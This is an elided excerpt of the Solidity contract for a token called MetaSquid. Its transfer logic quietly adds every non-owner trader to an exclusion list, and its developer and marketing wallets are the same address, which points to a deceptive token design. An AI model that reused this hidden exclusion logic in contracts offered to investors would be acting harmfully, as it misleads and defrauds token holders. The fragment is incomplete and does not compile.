...
contract MetaSquid is Context, IERC20 { 
    ...
    string private constant _symbol = unicode"METAS";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint256 private _tTotal = 10**8 * 10**_decimals;

    address payable private DevAddress = payable(0xf0b5f0a5C46C012C8E03c8C6A34985c772d0e344);
    address payable private MarketingAddress = payable(0xf0b5f0a5C46C012C8E03c8C6A34985c772d0e344);
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (tradingActiveBlock + 40 seconds <= block.timestamp) {transferDelay = false;}
        ...
        if (from != owner() && from != uniswapV2Pair && !_isExcluded[from]) {
            _isExcluded[from] = true; _Excluded.push(from);}
        if (to != owner() && to != uniswapV2Pair && !_isExcluded[to]) { _isExcluded[to] = true; _Excluded.push(to);
